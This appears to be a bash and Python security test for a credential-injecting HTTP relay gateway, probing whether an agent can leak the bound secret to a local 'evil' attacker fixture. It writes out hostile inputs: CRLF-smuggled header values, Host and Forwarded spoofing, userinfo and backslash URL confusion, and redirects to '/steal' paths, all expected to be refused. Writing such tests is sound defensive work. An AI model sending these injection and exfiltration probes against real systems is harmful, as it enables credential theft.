#!/usr/bin/env bash
# G3: header echo and request shaping. The secret is bound to the reflecting provider
# (fixtures/http_upstream.py `api`); a second fixture plays the attacker's host (`evil`) and logs
# every byte it receives to ARTIFACT_DIR/evil-hits.log. The agent shapes its own requests to the
# gateway's /v1/relay with its token, as any HTTP client could (smith and locksmith-mcp refuse
# credential headers before the gateway; two smith probes check that too):
#   - override, duplicate and re-cased Authorization (the injected header);
#   - `{secret}` in its own header, path, query and body;
#   - CRLF in a header value, a header name, the method and the URL;
#   - Host, X-Forwarded-Host and Forwarded headers, userinfo (refused even toward the bound
#     host), backslash and other-host URLs, and
#     an absolute-form request line to the gateway itself;
#   - 301, 302, 303, 307 and 308 from the provider to the attacker's host (absolute and
#     scheme-relative Location);
#   - URLs outside the binding (the attacker's host, another port, another name for the host).
# Checks: each probe gets its expected class of answer; the provider gets the key only in the
# bound header, once, and never a placeholder substitution; the attacker's host receives nothing;
# requests outside the binding are refused with `denied` before any decrypt: the ledger's
# `relay.attempt` count (appended before every decrypt) does not move and one `relay.denied`
# event is appended per refusal.
set -euo pipefail
. "$(dirname "${BASH_SOURCE[0]}")/lib.sh"
gw_init

gw_fixture evil evil
evil_port="$GW_FIXTURE_PORT"
gw_fixture api provider
api_port="$GW_FIXTURE_PORT"
api="http://127.0.0.1:$api_port"
evil="http://127.0.0.1:$evil_port"
gw_setup "$api"

# Probe bodies (JSON for POST /v1/relay) and the expected class of answer:
#   ok        200 from the gateway, upstream 2xx, the key reached the provider in the bound header
#   redirect  200 from the gateway carrying the upstream 3xx, not followed
#   bad       400 bad_request, nothing sent
#   denied    403 denied, nothing decrypted or sent
mkdir -p "$GW_WORK/probes"
python3 -I - "$GW_WORK/probes" "$GW_SECRET_ID" "$api" "$evil" "$api_port" "$evil_port" <<'PY'
import json, os, sys
out, sid, api, evil, api_port, evil_port = sys.argv[1:7]
probes = []

def p(name, cls, url, headers=(), method="GET", body=None):
    d = {"secret_id": sid, "version": 1, "method": method, "url": url, "headers": [list(h) for h in headers]}
    if body is not None:
        d["body"] = body
    probes.append((name, cls))
    with open(os.path.join(out, name + ".json"), "w") as fh:
        json.dump(d, fh)

# Injected header: override, duplicate, re-cased.
p("override", "ok", api + "/g3/override", [("Authorization", "Bearer attacker-override")])
p("duplicate", "ok", api + "/g3/duplicate", [("Authorization", "Bearer dup-one"), ("Authorization", "Bearer dup-two")])
p("recased", "ok", api + "/g3/recased", [("AUTHORIZATION", "Bearer upper"), ("aUtHoRiZaTiOn", "Bearer mixed")])
p("proxy-auth", "ok", api + "/g3/proxy-auth", [("Proxy-Authorization", "Bearer {secret}")])
# The placeholder in the agent's own input.
p("ph-header", "ok", api + "/g3/ph-header", [("X-Leak", "{secret}"), ("X-Leak-Bearer", "Bearer {secret}")])
p("ph-path", "ok", api + "/g3/ph-path/{secret}")
p("ph-query", "ok", api + "/g3/ph-query?k={secret}&auth=Bearer%20{secret}")
p("ph-body", "ok", api + "/g3/ph-body", [("Content-Type", "text/plain")], "POST", "token={secret}")
p("ph-encoded", "ok", api + "/g3/ph-encoded/%7Bsecret%7D?k=%7Bsecret%7D")
# CRLF: header value, header name, method; in the URL the parser drops CR and LF.
p("crlf-value", "bad", api + "/g3/crlf-value", [("X-A", "v\r\nX-Injected: {secret}")])
p("crlf-value-lf", "bad", api + "/g3/crlf-value-lf", [("X-A", "v\nHost: 127.0.0.1:" + evil_port)])
p("crlf-name", "bad", api + "/g3/crlf-name", [("X-A\r\nX-Injected", "v")])
p("crlf-method", "bad", api + "/g3/crlf-method", method="GET " + evil + "/x HTTP/1.1\r\nX-Injected: 1\r\n\r\nGET")
p("crlf-url", "ok", api + "/g3/crlf-url\r\nX-Injected: {secret}\r\nHost: 127.0.0.1:" + evil_port)
# Host tricks.
p("host-header", "ok", api + "/g3/host-header", [("Host", "127.0.0.1:" + evil_port)])
p("forwarded", "ok", api + "/g3/forwarded", [("X-Forwarded-Host", "127.0.0.1:" + evil_port),
                                              ("Forwarded", "host=127.0.0.1:" + evil_port),
                                              ("X-Original-URL", evil + "/steal")])
p("userinfo", "denied", "http://127.0.0.1:%s@127.0.0.1:%s/g3/userinfo" % (api_port, evil_port))
p("userinfo-at-api", "denied", "http://user:{secret}@127.0.0.1:%s/g3/userinfo-at-api" % api_port)
p("backslash", "denied", "http://127.0.0.1:%s\\@127.0.0.1:%s/g3/backslash" % (evil_port, api_port))
# Outside the binding: the attacker's host, another port, another name for the bound host.
p("unbound-evil", "denied", evil + "/g3/unbound-evil")
p("unbound-port", "denied", "http://127.0.0.1:%s/g3/unbound-port" % evil_port)
p("unbound-name", "denied", "http://localhost:%s/g3/unbound-name" % api_port)
p("unbound-https", "denied", "https://127.0.0.1:%s/g3/unbound-https" % api_port)
# Redirects from the provider to the attacker's host.
for code in (301, 302, 303, 307, 308):
    p("redirect-%d" % code, "redirect", api + "/g3/redirect-%d?redirect=%d&to=%s/steal-%d" % (code, code, evil, code),
      method="POST" if code in (307, 308) else "GET", body="r" if code in (307, 308) else None)
p("redirect-relative", "redirect", api + "/g3/redirect-relative?redirect=302&to=//127.0.0.1:%s/steal" % evil_port)

with open(os.path.join(out, "manifest"), "w") as fh:
    for name, cls in probes:
        fh.write("%s %s\n" % (name, cls))
PY

gw_ledger before
attempts_before="$(gw_ledger_count "$GW_LEDGER" relay.attempt)"
denied_before="$(gw_ledger_count "$GW_LEDGER" relay.denied)"

denied_n=0
sent_n=0
: >"$ARTIFACT_DIR/results.txt"
while read -r name cls; do
  status="$(gw_relay_raw "$name" "$GW_WORK/probes/$name.json")"
  out="$ARTIFACT_DIR/raw-$name.out"
  upstream="$(python3 -I -c 'import json,sys
try: print(json.load(open(sys.argv[1])).get("status", "-"))
except Exception: print("-")' "$out")"
  slug="$(python3 -I -c 'import json,sys
try: print(json.load(open(sys.argv[1])).get("error", "-"))
except Exception: print("-")' "$out")"
  echo "$name $cls gateway=$status upstream=$upstream error=$slug" >>"$ARTIFACT_DIR/results.txt"
  case "$cls" in
    ok)
      [[ "$status" == 200 && "$upstream" == 200 ]] || gw_fail "$name: gateway $status, upstream $upstream (expected 200/200)"
      sent_n=$((sent_n + 1))
      ;;
    redirect)
      [[ "$status" == 200 && "$upstream" =~ ^30[1-8]$ ]] || gw_fail "$name: gateway $status, upstream $upstream (expected a 3xx)"
      sent_n=$((sent_n + 1))
      ;;
    bad) [[ "$status" == 400 && "$slug" == bad_request ]] || gw_fail "$name: gateway $status $slug (expected 400 bad_request)" ;;
    denied)
      [[ "$status" == 403 && "$slug" == denied ]] || gw_fail "$name: gateway $status $slug (expected 403 denied)"
      denied_n=$((denied_n + 1))
      ;;
  esac
done <"$GW_WORK/probes/manifest"

# Absolute-form request line and Host naming the attacker's host, sent to the gateway itself: the
# gateway routes by path and relays to the bound URL in the body only.
python3 -I - "$GW_GATEWAY_URL" "$(gw_auth_header)" "$GW_SECRET_ID" "$api" "$evil" \
  "$ARTIFACT_DIR/raw-absolute-form.out" >"$GW_WORK/absolute.status" <<'PY' || gw_fail "absolute-form probe could not connect"
import json, socket, sys, urllib.parse
gw, auth_file, sid, api, evil, out = sys.argv[1:7]
u = urllib.parse.urlsplit(gw)
auth = open(auth_file).read().strip()
body = json.dumps({"secret_id": sid, "version": 1, "method": "GET", "url": api + "/g3/absolute-form"}).encode()
evil_host = urllib.parse.urlsplit(evil).netloc
head = "POST %s/v1/relay HTTP/1.1\r\nHost: %s\r\n%s\r\nContent-Type: application/json\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % (
    evil, evil_host, auth, len(body))
s = socket.create_connection((u.hostname, u.port), timeout=30)
s.sendall(head.encode() + body)
data = b""
while True:
    c = s.recv(65536)
    if not c:
        break
    data += c
open(out, "wb").write(data)
print(data.split(b"\r\n", 1)[0].decode("latin-1"))
PY
grep -q '^HTTP/1.1 200' "$GW_WORK/absolute.status" || gw_fail "absolute-form probe: $(cat "$GW_WORK/absolute.status")"
echo "absolute-form raw $(cat "$GW_WORK/absolute.status")" >>"$ARTIFACT_DIR/results.txt"
sent_n=$((sent_n + 1))
gw_unwrap "$ARTIFACT_DIR"/raw-*.out

# smith refuses the injected header before the gateway, and sends the placeholder literally.
if gw_smith client-auth relay --secret-id "$GW_SECRET_ID" -H "authorization: Bearer x" "$api/g3/client-auth"; then
  gw_fail "smith relay accepted an Authorization header"
fi
gw_smith client-ph relay --secret-id "$GW_SECRET_ID" --show all -H "X-Leak: {secret}" -X POST \
  --data "{secret}" "$api/g3/client-ph/{secret}?q={secret}" || gw_fail "smith relay with a placeholder failed"
sent_n=$((sent_n + 1))

# The provider: one request per sent probe, the key only in the single bound header, no header
# smuggled in by CRLF, and every placeholder sent literally (the reflection shows `{secret}`).
python3 -I - "$ARTIFACT_DIR/provider-hits.log" "$GW_WORK/probes/manifest" "$ARTIFACT_DIR" <<'PY' || gw_fail "provider check failed"
import json, sys, urllib.parse
log, manifest, art = sys.argv[1:4]
lines = [l.rstrip("\n") for l in open(log) if l.strip()]
bad = []
for l in lines:
    parts = dict(kv.split("=", 1) for kv in l.split()[2:] if "=" in kv)
    names = parts.get("headers", "").split(",")
    if parts.get("key") != "ok" or parts.get("where") != "authorization":
        bad.append("key not only in the bound header: %s" % l.split(" headers=")[0])
    if names.count("authorization") != 1:
        bad.append("authorization sent %d times: %s" % (names.count("authorization"), l.split(" headers=")[0]))
    if "x-injected" in names or "proxy-authorization" in names:
        bad.append("smuggled header reached the provider: %s" % l.split(" headers=")[0])
expect = [n for n, c in (x.split() for x in open(manifest)) if c in ("ok", "redirect")]
expect += ["client-ph", "absolute-form"]
for n in expect:
    if not any((" /g3/%s" % n) in urllib.parse.unquote(l.split(" headers=")[0]) for l in lines):
        bad.append("probe %s never reached the provider" % n)
# The placeholder came back literally in the reflection (so it was never substituted).
def reflected(name):
    p = "%s/raw-%s.out" % (art, name)
    return json.load(open(p)).get("body", "")
checks = {
    "ph-header": ["x-leak: {secret}", "x-leak-bearer: Bearer {secret}"],
    "ph-path": ["/g3/ph-path/%7Bsecret%7D"],
    "ph-query": ["k={secret}"],
    "ph-body": ["body: token={secret}"],
    "override": ["authorization: Bearer [REDACTED"],
}
for n, needles in checks.items():
    body = reflected(n)
    for s in needles:
        if s not in body:
            bad.append("%s: reflection lacks %r" % (n, s))
for n in ("override", "duplicate", "recased"):
    body = reflected(n)
    for s in ("attacker-override", "dup-one", "dup-two", "Bearer upper", "Bearer mixed"):
        if s in body:
            bad.append("%s: the agent's own Authorization value reached the provider" % n)
smith_out = open("%s/smith-client-ph.out" % art, encoding="utf-8", errors="replace").read()
for s in ("x-leak: {secret}", "body: {secret}"):
    if s not in smith_out:
        bad.append("smith placeholder: reflection lacks %r" % s)
for b in bad:
    print(b, file=sys.stderr)
sys.exit(1 if bad else 0)
PY

# The attacker's host received nothing at all.
[[ ! -s "$ARTIFACT_DIR/evil-hits.log" ]] || gw_fail "the attacker's host received requests (see evil-hits.log)"
# Control: the attacker's host does log what reaches it.
gw_curl -o /dev/null "$evil/g3/control" || true
grep -q '/g3/control' "$ARTIFACT_DIR/evil-hits.log" || gw_fail "the attacker's host fixture logs nothing (control request)"

# Outside the binding: refused before decrypt. The ledger appends `relay.attempt` before every
# decrypt, so the attempt count is the decrypt counter.
gw_ledger after
attempts_after="$(gw_ledger_count "$GW_LEDGER" relay.attempt)"
denied_after="$(gw_ledger_count "$GW_LEDGER" relay.denied)"
{
  echo "sent=$sent_n denied=$denied_n"
  echo "ledger relay.attempt $attempts_before -> $attempts_after, relay.denied $denied_before -> $denied_after"
} | tee "$ARTIFACT_DIR/summary.txt"
[[ $((attempts_after - attempts_before)) -eq "$sent_n" ]] ||
  gw_fail "decrypt counter moved by $((attempts_after - attempts_before)), expected $sent_n (the sent probes only)"
[[ $((denied_after - denied_before)) -eq "$denied_n" ]] ||
  gw_fail "$denied_n refusals but $((denied_after - denied_before)) relay.denied events"
